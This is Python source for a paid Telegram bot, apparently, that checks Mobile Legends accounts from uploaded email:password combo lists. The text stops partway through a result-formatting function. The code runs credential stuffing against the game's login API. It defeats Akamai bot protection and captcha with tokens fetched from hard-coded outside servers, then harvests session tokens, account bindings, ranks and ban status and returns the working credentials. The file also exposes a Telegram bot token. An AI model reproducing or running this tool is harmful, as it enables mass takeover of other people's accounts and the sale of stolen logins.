import re
import time
import json
import uuid
import queue
import hashlib
import hmac
import secrets
import sys
import os
import io
import threading
import asyncio
import requests
import urllib3
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
    ConversationHandler,
)
from telegram.error import RetryAfter

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TOKEN    = "8559644982:AAGAXEyZrnWSpRtQguVDJXXKWBadCMaZ5XE"
ADMIN_ID = 5674812663
CHANNEL  = "nixzllss"

API_URL      = "http://144.91.112.169:4040/check"
AKAMAI_API   = "http://5.189.140.181:3030/api/status"
CN31_API     = "http://5.189.140.181:8080/stats"

CN31_SERVER        = "http://5.189.140.181:8080/get-token"
ABCK_SERVER        = "http://5.189.140.181:3030"
ABCK_ENDPOINT      = "/api/get-token"
ABCK_SAVE_ENDPOINT = "/api/save-token"
ABCK_CHECKS_PER_TOKEN = 50

MLBB_URL = "https://accountmtapi.mobilelegends.com"
BAN_AKAMAI_API = "http://5.189.140.181:3030/api/get-token"
BAN_CN31_API   = "http://5.189.140.181:8080/get-token"
API_STATS  = "https://app.web.moontontech.com/actgateway/battlereport/stats"
API_HEROES = "https://app.web.moontontech.com/actgateway/battlereport/heros/frequent"

FREE_DAILY_LINES   = 20
REFERRAL_BONUS     = 5
TOP_INVITER_BONUS  = 50
PREMIUM_THREADS    = 5
FREE_THREADS       = 4
FREE_BAN_DAILY     = 2
REFERRAL_BAN_BONUS = 2
PREMIUM_BAN_BONUS  = 10
MAX_COMBO_LINES    = 1000

PRICING_TEXT = (
    "━━━━━━━━━━━━━━━━━━━━━━━━\n"
    "  <b>PREMIUM PRICING</b>\n"
    "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    "  1 Day    — <b>₱50</b>\n"
    "  3 Days   — <b>₱100</b>\n"
    "  1 Week   — <b>₱150</b>\n\n"
    "━━━━━━━━━━━━━━━━━━━━━━━━\n"
    "  <b>Premium Advantages</b>\n"
    "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    "  Unlimited checking (no daily cap)\n"
    "  No waiting in line\n"
    "  Higher priority over free users\n"
    "  8 threads (faster checking)\n"
    "  Access to all premium features\n\n"
    "To purchase, contact: @nixzlls"
)

INFO_TEXT = (
    "ℹ <b>BOT INFO</b>\n"
    "\n\n"
    "<b>NIXSZ MLBB ACCOUNT CHECKER</b>\n\n"
    "• Check MLBB accounts via Nixsz API\n"
    "• Send a .txt file with combos\n"
    "• Format: <code>email:password</code> per line\n"
    "• Valid accounts sent directly to you\n\n"
    "\n\n"
    " <b>REFERRAL SYSTEM:</b>\n"
    "• Each referral you invite = <b>+5 free checks</b>\n"
    "• You & your friend both get +5 on use\n"
    "• Daily top inviter gets <b>+50 bonus checks</b>\n"
    "• Anti-duplicate: each user can only use 1 referral\n"
    "• Use /myinfo to see your referral link & stats\n\n"
    "\n\n"
    " Channel: https://t.me/nixzllss\n"
    " Owner: @nixzlls"
)

DATA_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data.json")
data_lock = threading.Lock()

AWAITING_CHECK_FILE        = 1
AWAITING_GENKEY_INPUT      = 2
AWAITING_SEMI_EMAIL        = 10
AWAITING_SEMI_PASSWORD     = 11
AWAITING_BAN_INPUT         = 15
AWAITING_FEEDBACK_MSG      = 20
AWAITING_ANNOUNCEMENT_MSG  = 30
AWAITING_VOTE_MSG          = 31
AWAITING_VOTE_DURATION     = 32
AWAITING_VOTE_CHOICES      = 33
AWAITING_ADDCHECKS_INPUT   = 40
AWAITING_BROADCAST_MSG     = 50

lock          = threading.Lock()
cancel_flag   = {}
stats_store   = {}
chat_id_store = {}

free_check_queue   = queue.Queue()
free_queue_lock    = threading.Lock()
free_queue_active  = set()

print_lock = threading.Lock()

def _safe_threadsafe(coro, loop):
    try:
        fut = asyncio.run_coroutine_threadsafe(coro, loop)
        return fut.result(timeout=30)
    except RetryAfter as e:
        time.sleep(e.retry_after + 1)
        return None
    except Exception:
        return None

async def _safe_send(coro, retries=5):
    for attempt in range(retries):
        try:
            return await coro
        except RetryAfter as e:
            await asyncio.sleep(e.retry_after + 1)
        except Exception:
            return None
    return None

_abck_fetch_lock = threading.Lock()
_abck_fetching   = threading.Event()
_consecutive_rl_count = 0
_consecutive_rl_lock  = threading.Lock()
_flood_until          = 0
_flood_lock           = threading.Lock()

def _check_flood_wait():
    with _flood_lock:
        wait = _flood_until - time.time()
    if wait > 0:
        time.sleep(wait)

_cn31_spinner_chars = ['|', '/', '-', '\\']
_cn31_spinner_idx   = 0
_cn31_spinner_lock  = threading.Lock()

BINDING_MAP_SEMI = {
    "mt-and_":         "Moonton",
    "fb-and_":         "Facebook",
    "vk-and_":         "VK",
    "google-and_":     "Google Play",
    "apple-and_":      "Apple",
    "twitter-and_":    "Twitter",
    "tiktok-and_":     "TikTok",
    "gamecenter-ios_": "Game Center",
    "googleplay-ios_": "Google Play",
    "gg_":             "Google Play",
    "gg-and_":         "Google Play",
    "gg-ios_":         "Google Play",
}

EMAIL_DOMAINS_BOT = (
    "@gmail.", "@googlemail.",
    "@yahoo.", "@ymail.", "@rocketmail.",
    "@hotmail.", "@outlook.", "@live.", "@msn.",
    "@icloud.", "@me.", "@mac.",
    "@aol.",
    "@proton.", "@protonmail.",
    "@gmx.", "@gmxmail.",
    "@zoho.",
    "@yandex.",
    "@mail.", "@inbox.", "@fastmail.",
    "@tutanota.", "@tuta.",
    "@qq.", "@163.", "@126.", "@yeah.",
    "@sina.", "@sohu.",
    "@naver.", "@daum.", "@hanmail.",
    "@rediffmail.",
    "@web.",
    "@laposte.",
    "@libero.",
    "@virgilio.",
    "@orange.",
    "@wanadoo.",
    "@free.",
    "@btinternet.",
    "@sky.",
    "@talktalk.",
    "@virginmedia.",
    "@cox.",
    "@comcast.",
    "@verizon.",
    "@att.",
    "@bellsouth.",
    "@charter.",
    "@shaw.",
    "@rogers.",
    "@telus.",
    "@mail.ru",
    "@bk.ru",
    "@list.ru",
    "@inbox.ru",
    "@edu.",
    "@ac.",
    "@gov.",
    "@govt.",
    "@mil.",
    "@army.",
    "@navy.",
    "@airforce.",
    "@police.",
    "@org.",
    "@net.",
    "@com.",
    "@co.",
    "@int.",
    "@biz.",
    "@info.",
    "@name.",
    "@mobi.",
    "@travel.",
    "@museum.",
    "@jobs.",
    "@asia.",
    "@eu.",
    "@us.",
    "@uk.",
    "@ca.",
    "@au.",
    "@nz.",
    "@jp.",
    "@kr.",
    "@cn.",
    "@hk.",
    "@tw.",
    "@sg.",
    "@my.",
    "@id.",
    "@th.",
    "@vn.",
    "@ph.",
    "@in.",
    "@pk.",
    "@bd.",
    "@lk.",
    "@ae.",
    "@sa.",
    "@qa.",
    "@om.",
    "@kw.",
    "@bh.",
    "@za.",
    "@ng.",
    "@ke.",
    "@eg.",
    "@de.",
    "@fr.",
    "@it.",
    "@es.",
    "@pt.",
    "@nl.",
    "@be.",
    "@ch.",
    "@at.",
    "@se.",
    "@no.",
    "@dk.",
    "@fi.",
    "@pl.",
    "@cz.",
    "@sk.",
    "@hu.",
    "@ro.",
    "@bg.",
    "@gr.",
    "@tr.",
    "@ru.",
    "@ua.",
    "@br.",
    "@ar.",
    "@cl.",
    "@co.",
    "@mx.",
    "@pe.",
)

def is_email_account(login):
    lo = login.lower()
    return any(d in lo for d in EMAIL_DOMAINS_BOT)

def md5(text):
    return hashlib.md5(text.encode()).hexdigest()

def make_sign(data):
    so = "&".join(f"{k}={v}" for k, v in sorted(data.items())) + "&op=login"
    return md5(so)

def convert_rank_semi(myrank):
    try:
        myrank = int(myrank) if myrank else 0
    except Exception:
        return "Unknown Rank"
    if 0 <= myrank <= 14:   return "Warrior"
    if 15 <= myrank <= 29:  return "Elite"
    if 30 <= myrank <= 49:  return "Master"
    if 50 <= myrank <= 74:  return "Grandmaster"
    if 75 <= myrank <= 99:  return "Epic"
    if 100 <= myrank <= 124: return "Legend"
    if myrank >= 125:        return "Mythic"
    return "Unknown Rank"

def parse_binding_semi(response):
    data = response.get('data', {})
    emails = data.get('bind_email', []) if isinstance(data, dict) else response.get('bind_email', [])
    bindings = []
    if emails and isinstance(emails, list):
        for b in emails:
            matched = False
            for prefix, name in BINDING_MAP_SEMI.items():
                if str(b).startswith(prefix):
                    if name not in bindings:
                        bindings.append(name)
                    matched = True
                    break
            if not matched:
                bindings.append(f"Unknown({b})")
    return ", ".join(bindings) if bindings else "None"

def is_valid_abck(token):
    if not isinstance(token, str):
        return False
    parts = token.strip().split("~")
    return len(parts) >= 5 and len(parts[0]) == 32 and len(token) > 200

def fetch_abck_token_semi(exclude=None):
    excluded = set(exclude) if exclude else set()
    for attempt in range(10):
        try:
            r = requests.get(ABCK_SERVER + ABCK_ENDPOINT, params={"count": 1}, timeout=10)
            if r.status_code == 200:
                data = r.json()
                for key in ["_abck", "abck", "token", "cookie", "value"]:
                    val = str(data.get(key, "")).strip()
                    if not is_valid_abck(val):
                        continue
                    if val in excluded:
                        time.sleep(3)
                        break
                    try:
                        requests.post(ABCK_SERVER + ABCK_SAVE_ENDPOINT, json={"token": val}, timeout=8)
                    except Exception:
                        pass
                    return val
            time.sleep(2)
        except Exception:
            time.sleep(2)
    return None

def fetch_cn31_token_semi():
    global _cn31_spinner_idx
    for attempt in range(10):
        try:
            resp = requests.get(CN31_SERVER, timeout=10)
            data = resp.json()
            token = data.get("token", "")
            if isinstance(token, str) and token.startswith("CN31_") and len(token) > 20:
                return token
            time.sleep(2)
        except Exception:
            time.sleep(2)
    return None

def get_stats_semi(jwt):
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10)",
        "Accept": "application/json, text/plain, */*",
        "X-Token": jwt,
        "X-Lang": "id",
        "Origin": "https://www.mobilelegends.com",
        "Referer": "https://www.mobilelegends.com/",
    }
    r = requests.get(API_STATS, headers=headers, timeout=10)
    r.raise_for_status()
    return r.json()

def get_frequent_heroes_semi(jwt, sid, limit=5):
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10)",
        "Accept": "application/json, text/plain, */*",
        "X-Token": jwt,
        "X-Lang": "id",
    }
    params = {"sid": sid, "limit": limit}
    r = requests.get(API_HEROES, headers=headers, params=params, timeout=10)
    r.raise_for_status()
    return r.json().get("data", {}).get("result", [])

def build_battle_info_semi(stats_json, jwt):
    if not stats_json or stats_json.get("code") != 0:
        return "N/A"
    d = stats_json["data"]
    wc = d.get("wc", 0)
    tc = d.get("tc", 1)
    wr = (wc / tc * 100) if tc else 0
    best = {
        "DMG":  d.get("mo", {}).get("hid_e", {}).get("n", "-"),
        "Kill": d.get("hk", {}).get("hid_e", {}).get("n", "-"),
        "Gold": d.get("mg", {}).get("hid_e", {}).get("n", "-"),
    }
    favs = []
    sids = d.get("sids", [])[:2]
    for sid in sids:
        heroes = get_frequent_heroes_semi(jwt, sid, limit=2)
        for h in heroes:
            h_tc = h.get("tc", 0)
            h_wc = h.get("wc", 0)
            rate = int(h_wc / h_tc * 100) if h_tc else 0
            favs.append(f"{h['hid_e']['n']}({h_tc}/{rate}%)")
    return (
        f"Winrate: {wr:.1f}% | Match: {tc} | MVP: {d.get('mvpc')} | WS: {d.get('wsc')}\n"
        f"Best: DMG {best['DMG']} | Kill {best['Kill']} | Gold {best['Gold']}\n"
        f"Favorite: {', '.join(favs[:3])}"
    )

def do_semi_check(email, password):
    cap = fetch_cn31_token_semi()
    if not cap:
        return None, "CN31 server unreachable — check stock and try again"
    p   = md5(password)
    params = {
        "account": email,
        "md5pwd": p,
        "game_token": "",
        "recaptcha_token": "",
        "e_captcha": cap,
        "country": ""
    }
    payload = {
        "op": "login",
        "sign": make_sign(params),
        "params": params,
        "lang": "en"
    }
    abck = fetch_abck_token_semi()
    if not abck:
        return None, "Akamai server unreachable — check stock and try again"
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0",
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Content-Type": "application/json",
        "sec-ch-ua-platform": "\"Android\"",
        "sec-ch-ua": "\"Chromium\";v=\"142\", \"Google Chrome\";v=\"142\", \"Not_A Brand\";v=\"99\"",
        "sec-ch-ua-mobile": "?1",
        "origin": "https://mtacc.mobilelegends.com",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://mtacc.mobilelegends.com/",
        "accept-language": "en-US,en;q=0.9",
        "priority": "u=1, i"
    })
    session.cookies.set("_abck", abck)

    r  = session.post(MLBB_URL, json=payload, timeout=20)
    if r.status_code == 429:
        return None, "Rate limited — try again later"

    try:
        js = r.json()
    except Exception:
        return None, "Invalid response from server"

    if js.get("sec-cp-challenge") == "true":
        return None, "Akamai challenge blocked — try again"

    code    = js.get("code")
    message = js.get("message", "") or ""

    if code == 1013 or (message and "captcha" in message.lower()):
        return None, f"Captcha error: {message}"

    if code != 0:
        return None, message if message else "Invalid credentials"

    login_data    = js.get("data") or {}
    session_token = login_data.get("session", "")
    gui           = login_data.get("guid", "")

    if not session_token:
        return None, "No session token returned"

    jwt_payload = {"id": gui, "token": session_token, "type": "mt_And"}
    jwt_req  = session.post(
        "https://api.mobilelegends.com/tools/deleteaccount/getToken",
        json=jwt_payload,
        headers={"Authorization": session_token},
        timeout=20
    )
    jwt_data = jwt_req.json()
    jwt      = jwt_data.get("data", {}).get("jwt", "")

    if not jwt:
        return None, "No account found"

    bind_check    = session.post(
        "https://api.mobilelegends.com/tools/deleteaccount/getCancelAccountInfo",
        headers={"Authorization": f"Bearer {jwt}"},
        json={},
        timeout=15
    )
    bind_response = bind_check.json()
    bind_data     = bind_response.get("data", {})
    bindings_text = parse_binding_semi(bind_response)
    all_roles     = bind_data.get("all_roles", [])
    account_count = len(all_roles)

    is_banned         = False
    ban_status        = "FALSE"
    ban_reason        = "-"
    ban_violation_time = "-"
    ban_expires       = "-"
    try:
        ban_check = session.post(
            "https://api.mobilelegends.com/tools/selfservice/punishList",
            headers={
                "Authorization": f"Bearer {jwt}",
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0",
                "Accept": "application/json, text/plain, */*",
                "Origin": "https://play.mobilelegends.com",
                "Referer": "https://play.mobilelegends.com/"
            },
            data=f"lang=en&token={session_token}",
            timeout=10
        )
        if ban_check.status_code == 200:
            ban_result  = ban_check.json()
            punishments = ban_result.get("data", [])
            if isinstance(punishments, list):
                for punishment in punishments:
                    if not isinstance(punishment, dict):
                        continue
                    reason      = str(punishment.get("reason", "")).strip()
                    unlock_time = str(punishment.get("unlock_time", "")).strip()
                    violation_t = str(punishment.get("violation_time", "")).strip()
                    if reason or unlock_time:
                        is_banned          = True
                        ban_status         = "TRUE"
                        ban_reason         = reason.capitalize() if reason else "Unknown"
                        ban_violation_time = violation_t if violation_t else "-"
                        ban_expires        = unlock_time if unlock_time else "Permanent"
                        break
    except Exception:
        pass

    info_req  = session.post(
        "https://sg-api.mobilelegends.com/base/getBaseInfo",
        headers={"Authorization": f"Bearer {jwt}"},
        data={},
        timeout=15
    )
    info_json = info_req.json().get("data") or {}

    name  = info_json.get("name", "Unknown")
    level = info_json.get("level", "N/A")

    current_rank_level = info_json.get("rank_level", 0)
    if current_rank_level == 0:
        rank_data = info_json.get("rank", {})
        if isinstance(rank_data, dict):
            current_rank_level = rank_data.get("level", 0)

    highest_rank_level = info_json.get("history_rank_level", 0)
    if highest_rank_level == 0:
        history_rank_data = info_json.get("historyRank", info_json.get("history_rank", {}))
        if isinstance(history_rank_data, dict):
            highest_rank_level = history_rank_data.get("level", 0)

    acc_country  = info_json.get("reg_country", "N/A")
    role_id      = info_json.get("roleId", "N/A")
    zone_id      = info_json.get("zoneId", "N/A")
    avatar       = info_json.get("avatar", "N/A")
    current_rank = convert_rank_semi(current_rank_level)
    highest_rank = convert_rank_semi(highest_rank_level)

    battle_info = "N/A"
    try:
        stats_json  = get_stats_semi(jwt)
        battle_info = build_battle_info_semi(stats_json, jwt)
    except Exception:
        pass

    result = {
        "email":         email,
        "name":          name,
        "level":         str(level),
        "current_rank":  current_rank,
        "highest_rank":  highest_rank,
        "bindings":      bindings_text,
        "region":        acc_country,
        "role_id":       str(role_id),
        "zone_id":       str(zone_id),
        "avatar":        avatar,
        "guid":          gui,
        "account_count": str(account_count),
        "multiple":      "Yes" if account_count > 1 else "No",
        "ban_status":    ban_status,
        "ban_reason":    ban_reason,
        "ban_violation": ban_violation_time,
        "ban_expires":   ban_expires,
        "is_banned":     is_banned,
        "battle_info":   battle_info,
        "session_token": session_token,
    }
    return result, None

def format_semi_result(data):
    sep = "────────────────────────"
    status_label = "[ BANNED ]" if data["is_banned"] else "[ SUCCESS ]"
    lines = [
        f"<b>SEMI CHECK {status_label}</b>",
        sep,
        f"<b>LOGIN:</b> <code>{data['email']}</code>",
        f"<b>NAME:</b> {data['name']}",
        f"<b>LEVEL:</b> {data['level']}",
        f"<b>CURRENT RANK:</b> {data['current_rank']}",
        f"<b>HIGHEST RANK:</b> {data['highest_rank']}",
        f"<b>BINDINGS:</b> {data['bindings']}",
        f"<b>REGION:</b> {data['region']}",
        f"<b>ROLE ID:</b> {data['role_id']}",
        f"<b>ZONE ID:</b> {data['zone_id']}",
        f"<b>GUID:</b> {data['guid']}",
        f"<b>MULTIPLE ACCOUNTS:</b> {data['multiple']} ({data['account_count']} total)",
        f"<b>BAN STATUS:</b> {data['ban_status']}",
        f"<b>BAN REASON:</b> {data['ban_reason']}",
        f"<b>BAN VIOLATION:</b> {data['ban_violation']}",
        f"<b>BAN EXPIRES:</b> {data['ban_expires']}",
        "",
        "<b>BATTLE REPORT:</b>",
    ]
    for bl in data["battle_info"].splitlines():
        lines.append(f"  {bl}")
    lines.append("")
    lines.append("<b>Powered by @nixzlls</b>")
    return "\n".join(lines)

def build_semi_stats_msg(st):
    v      = st["valid"]
    b      = st["banned"]
    nb     = v - b
    iv     = st["invalid"]
    er     = st["errors"]
    ch     = st["checked"]
    t      = st["total"]
    elapsed = time.time() - st["start_time"]
    h = int(elapsed // 3600)
    m = int((elapsed % 3600) // 60)
    s = int(elapsed % 60)
    elapsed_str = f"{h}h {m}m {s}s" if h else (f"{m}m {s}s" if m else f"{s}s")
    pct    = (ch / t * 100) if t > 0 else 0
    filled = int(20 * pct / 100)
    bar    = "█" * filled + "░" * (20 - filled)
    sep    = "────────────────────────"
    done   = ch >= t
    msg    = f"{sep}\n  <b>sᴇᴍɪ ɪɴꜰᴏ — ʟɪᴠᴇ sᴛᴀᴛs</b>\n{sep}\n\n"
    msg   += f"{bar} {pct:.1f}%\n\n"
    msg   += f"ᴛᴏᴛᴀʟ: {t}  ᴄʜᴇᴄᴋᴇᴅ: {ch}/{t}\n"
    msg   += f"ᴠᴀʟɪᴅ: {v}   ʙᴀɴɴᴇᴅ: {b}   ɴᴏᴛ: {nb}\n"
    msg   += f"ɪɴᴠᴀʟɪᴅ: {iv}  ᴇʀʀᴏʀ: {er}\n"
    msg   += f"ᴇʟᴀᴘsᴇᴅ: {elapsed_str}\n"
    msg   += "\n ᴄᴏᴍᴘʟᴇᴛᴇ" if done else "\nᴄʜᴇᴄᴋɪɴɢ..."
    return msg

def format_semi_result_plain(email, password, data):
    sep = "────────────────────────"
    status_label = "[ BANNED ]" if data["is_banned"] else "[ SUCCESS ]"
    lines = [
        f"SEMI CHECK {status_label}",
        sep,
        f"LOGIN: {email}:{password}",
        f"NAME: {data['name']}",
        f"LEVEL: {data['level']}",
        f"CURRENT RANK: {data['current_rank']}",
        f"HIGHEST RANK: {data['highest_rank']}",
        f"BINDINGS: {data['bindings']}",
        f"REGION: {data['region']}",
        f"ROLE ID: {data['role_id']}",
        f"ZONE ID: {data['zone_id']}",
        f"GUID: {data['guid']}",
        f"MULTIPLE ACCOUNTS: {data['multiple']} ({data['account_count']} total)",
        f"BAN STATUS: {data['ban_status']}",
        f"BAN REASON: {data['ban_reason']}",
        f"BAN VIOLATION: {data['ban_violation']}",
        f"BAN EXPIRES: {data['ban_expires']}",
        "",
        "BATTLE REPORT:",
    ]
    for bl in data["battle_info"].splitlines():
        lines.append(f"  {bl}")
    lines.append("")
    lines.append("Powered by @nixzlls")
    return "\n".join(lines)

def load_data():
    try:
        with open(DATA_FILE, "r") as f:
            return json.load(f)
    except Exception:
        return {
            "users": {},
            "keys": {},
            "announcements": [],
            "votes": {},
            "feedback": [],
            "combo_database": [],
            "global_stats": {
                "total_valid": 0,
                "total_invalid": 0,
                "total_checked": 0,
            }
        }

def save_data(d):
    with open(DATA_FILE, "w") as f:
        json.dump(d, f, indent=2)

def get_db():
    return load_data()

def save_db(d):
    save_data(d)

def ensure_db_keys(db):
    if "announcements" not in db:
        db["announcements"] = []
    if "votes" not in db:
        db["votes"] = {}
    if "feedback" not in db:
        db["feedback"] = []
    if "combo_database" not in db:
        db["combo_database"] = []

def get_user(db, uid):
    uid = str(uid)
    if uid not in db["users"]:
        db["users"][uid] = {
            "uid": uid,
            "username": None,
            "first_name": None,
            "is_premium": False,
            "premium_expires": None,
            "free_checks_remaining": FREE_DAILY_LINES,
            "last_reset": datetime.now().isoformat(),
            "total_checked": 0,
            "total_valid": 0,
            "total_invalid": 0,
            "referral_code": str(uuid.uuid4())[:8].upper(),
            "referred_by": None,
            "referral_count": 0,
            "referral_points": 0,
            "last_top_inviter_bonus": None,
            "joined": datetime.now().isoformat(),
            "free_checks_used_total": 0,
            "ban_checks_remaining": FREE_BAN_DAILY,
            "ban_checks_last_reset": datetime.now().isoformat(),
        }
    u = db["users"][uid]
    if "free_checks_used_total" not in u:
        u["free_checks_used_total"] = 0
    if "ban_checks_remaining" not in u:
        u["ban_checks_remaining"] = FREE_BAN_DAILY
    if "ban_checks_last_reset" not in u:
        u["ban_checks_last_reset"] = datetime.now().isoformat()
    return u

def reset_ban_checks_if_needed(user):
    last = datetime.fromisoformat(user.get("ban_checks_last_reset", datetime.now().isoformat()))
    if (datetime.now() - last).total_seconds() >= 86400:
        base = FREE_BAN_DAILY
        refs = user.get("referral_count", 0)
        user["ban_checks_remaining"] = base + refs * REFERRAL_BAN_BONUS
        user["ban_checks_last_reset"] = datetime.now().isoformat()

def reset_daily_if_needed(user):
    last = datetime.fromisoformat(user["last_reset"])
    now  = datetime.now()
    if (now - last).total_seconds() >= 86400:
        user["free_checks_remaining"] = FREE_DAILY_LINES
        user["last_reset"] = now.isoformat()

def is_premium(user):
    if not user.get("is_premium"):
        return False
    exp = user.get("premium_expires")
    if exp is None:
        return True
    return datetime.fromisoformat(exp) > datetime.now()

def can_check(user, lines_needed=1):
    if is_premium(user):
        return True, lines_needed
    reset_daily_if_needed(user)
    base_rem  = user.get("free_checks_remaining", 0)
    ref_pts   = user.get("referral_points", 0)
    ref_count = user.get("referral_count", 0)
    bulk_bonus = ref_count * PREMIUM_BAN_BONUS
    rem = base_rem + ref_pts + bulk_bonus
    if rem >= lines_needed:
        return True, lines_needed
    return False, rem

def deduct_checks(user, amount):
    if is_premium(user):
        return
    user["free_checks_used_total"] = user.get("free_checks_used_total", 0) + amount
    rp = user.get("referral_points", 0)
    if rp >= amount:
        user["referral_points"] -= amount
    elif rp > 0:
        user["referral_points"] = 0
        user["free_checks_remaining"] = max(0, user["free_checks_remaining"] - (amount - rp))
    else:
        user["free_checks_remaining"] = max(0, user["free_checks_remaining"] - amount)

def generate_key(db, duration_value, duration_unit, max_users=1, custom_key=None, key_type="full"):
    key_str = custom_key if custom_key else f"NIXSZ-{str(uuid.uuid4())[:8].upper()}"
    now = datetime.now()
    unit_map = {
        "minutes": timedelta(minutes=duration_value),
        "hours":   timedelta(hours=duration_value),
        "days":    timedelta(days=duration_value),
        "months":  timedelta(days=duration_value * 30),
        "years":   timedelta(days=duration_value * 365),
    }
    delta = unit_map.get(duration_unit, timedelta(days=duration_value))
    db["keys"][key_str] = {
        "key": key_str,
        "duration_value": duration_value,
        "duration_unit": duration_unit,
        "max_users": max_users,
        "used_by": [],
        "created_at": now.isoformat(),
        "duration_seconds": int(delta.total_seconds()),
        "active": True,
        "key_type": key_type,
    }
    return key_str

def redeem_key(db, uid, key_str):
    uid      = str(uid)
    key_data = db["keys"].get(key_str)
    if not key_data:
        return False, " Invalid key."
    if not key_data.get("active"):
        return False, " This key has been deactivated."
    if uid in key_data["used_by"]:
        return False, " You already used this key."
    if len(key_data["used_by"]) >= key_data["max_users"]:
        return False, " Key already in use (max users reached)."
    user = get_user(db, uid)
    key_type = key_data.get("key_type", "full")
    user["is_premium"] = True
    user["premium_key_type"] = key_type
    exp  = datetime.now() + timedelta(seconds=key_data["duration_seconds"])
    user["premium_expires"] = exp.isoformat()
    key_data["used_by"].append(uid)
    type_label = {"ban": "Ban Check Only", "semi": "Full Info Only", "full": "Full Access"}.get(key_type, "Full Access")
    return True, f" Key activated!\nAccess: <b>{type_label}</b>\nExpires: {exp.strftime('%Y-%m-%d %H:%M')}"

BINDING_MAP = {
    "mt-and_":         "Moonton",
    "fb-and_":         "Facebook",
    "vk-and_":         "VK",
    "google-and_":     "Google Play",
    "apple-and_":      "Apple",
    "twitter-and_":    "Twitter",
    "tiktok-and_":     "TikTok",
    "gamecenter-ios_": "Game Center",
    "googleplay-ios_": "Google Play",
    "gg_":             "Google Play",
    "gg-and_":         "Google Play",
    "gg-ios_":         "Google Play",
}

SKIN_TIER_ORDER = [
    "World", "Mega", "Exalted", "Renowned", "Collector", "Epic", "Special",
    "Elite", "Rare", "Normal", "Starlight", "Squad", "Misc"
]

def skin_tier_sort_key(tier_name):
    name_lower = tier_name.lower()
    for i, t in enumerate(SKIN_TIER_ORDER):
        if t.lower() in name_lower:
            return i
    return len(SKIN_TIER_ORDER)

def convert_rank_from_name(rank_str):
    if not rank_str or rank_str == "?":
        return "Unknown Rank"
    r = str(rank_str).lower()
    if "mythic" in r:      return "Mythic"
    if "legend" in r:      return "Legend"
    if "epic" in r:        return "Epic"
    if "grandmaster" in r: return "Grandmaster"
    if "master" in r:      return "Master"
    if "elite" in r:       return "Elite"
    if "warrior" in r:     return "Warrior"
    return "Unknown Rank"

def parse_ban_expired(ban_reason, ban_expires):
    date_str = None
    for text in [ban_expires, ban_reason]:
        if not text:
            continue
        m = re.search(r"(\d{4})[.\-/](\d{1,2})[.\-/](\d{1,2})", str(text))
        if m:
            date_str = f"{m.group(1)}-{m.group(2).zfill(2)}-{m.group(3).zfill(2)}"
            break
    if date_str:
        try:
            expire_dt = datetime.strptime(date_str, "%Y-%m-%d")
            return expire_dt < datetime.now(), date_str
        except Exception:
            pass
    return None, None

def format_hit_telegram(login, password, data):
    name        = data.get("name", "?")
    level       = data.get("level", "?")
    region      = data.get("region", "?")
    role_id     = data.get("role_id", "?")
    zone_id     = data.get("zone_id", "?")
    guid        = data.get("guid", "?")
    session     = data.get("session", "?")
    banned      = data.get("banned", False)
    ban_reason  = data.get("ban_reason", "-") or "-"
    ban_expires = data.get("ban_expires", "") or ""
    ban_history = data.get("ban_history", []) or []
    bindings    = data.get("bindings", [])
    bind_str    = ", ".join(bindings) if isinstance(bindings, list) and bindings else (str(bindings) if bindings else "None")
    st          = data.get("stats", {})
    heroes      = data.get("frequent_heroes", [])

    gd                 = data.get("game_data", {})
    skin_count         = gd.get("skin_count", 0)
    achievement_pts    = gd.get("achievement_points", 0)
    collector_point    = gd.get("collector_point", 0)
    collector_tier     = gd.get("collector_tier", "N/A")
    squad              = gd.get("squad", "-")
    location           = gd.get("location", "N/A")
    last_login         = gd.get("last_login", "N/A")
    last_login_country = gd.get("last_login_country", "N/A")
    create_country     = gd.get("create_account_country", "N/A")
    hero_count         = gd.get("hero_count", 0)
    hero_history       = gd.get("hero_history", [])
    skin_breakdown     = gd.get("skin_breakdown", {})
    high_rank_game     = gd.get("high_rank", "")
    current_rank_game  = gd.get("current_rank", "")
    login_history      = gd.get("login_history", [])

    display_rank    = current_rank_game if current_rank_game else data.get("rank", "?")
    display_highest = high_rank_game if high_rank_game else data.get("highest_rank", "?")

    ban_expired, expire_date = parse_ban_expired(ban_reason, ban_expires)
    if banned and ban_expired:
        banned = False

    ban_status   = "TRUE" if banned else "FALSE"
    status_label = "[ BANNED ]" if banned else "[ SUCCESS ]"

    lines = []
    lines.append(f"<b>ACCOUNT CHECK {status_label}</b>")
    lines.append("")
    lines.append(f"<b>LOGIN:</b> <code>{login}:{password}</code>")
    lines.append(f"<b>NAME:</b> {name}")
    lines.append(f"<b>LEVEL:</b> {level}")
    lines.append(f"<b>CURRENT RANK:</b> {display_rank}")
    lines.append(f"<b>HIGHEST RANK:</b> {display_highest}")
    lines.append(f"<b>BINDINGS:</b> {bind_str}")
    lines.append(f"<b>BAN STATUS:</b> {ban_status}")

    if banned:
        if ban_reason and ban_reason != "-":
            lines.append(f"<b>BAN REASON:</b> {ban_reason}")
        if ban_expires:
            lines.append(f"<b>BAN EXPIRES:</b> {ban_expires}")
    else:
        if ban_expired and expire_date:
            lines.append(f"<b>BAN HISTORY:</b> Previously banned - expired {expire_date} - now unban")
            if ban_reason and ban_reason != "-":
                lines.append(f"  Reason on record: {ban_reason}")
        elif ban_history:
            lines.append(f"<b>BAN HISTORY:</b> Previously banned ({len(ban_history)}x) - currently unban")
            for bh in ban_history[:3]:
                bh_reason  = bh.get("reason", "?") if isinstance(bh, dict) else str(bh)
                bh_date    = bh.get("date", "")    if isinstance(bh, dict) else ""
                bh_expired = bh.get("expired", True) if isinstance(bh, dict) else True
                tag   = "[Unbanned]" if bh_expired else "[Active]"
                entry = f"  {tag} {bh_reason}"
                if bh_date:
                    entry += f" ({bh_date})"
                lines.append(entry)
